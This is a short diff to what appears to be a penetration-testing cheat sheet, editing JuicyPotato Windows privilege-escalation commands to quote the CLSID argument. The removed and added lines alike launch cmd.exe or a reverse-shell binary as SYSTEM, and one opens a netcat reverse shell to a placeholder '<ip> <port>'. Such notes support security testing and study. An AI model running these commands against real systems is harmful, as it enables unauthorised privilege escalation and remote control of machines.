@@ -749,9 +749,9 @@ https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege
 
 ```
 CLSID is based on operating system, see above links for more information about list of CLSIDS.
-.\juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}
-.\juicypotato.exe -l 1337 -p c:\test\revshell.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}
-.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\test\nc.exe <ip> <port> -e cmd" -t * -c <CLSID>
+.\juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c "{4991d34b-80a1-4291-83b6-3328366b9097}"
+.\juicypotato.exe -l 1337 -p c:\test\revshell.exe -t * -c "{4991d34b-80a1-4291-83b6-3328366b9097}"
+.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\test\nc.exe <ip> <port> -e cmd" -t * -c "<CLSID>"
 ```
 
 ### [lolbins]
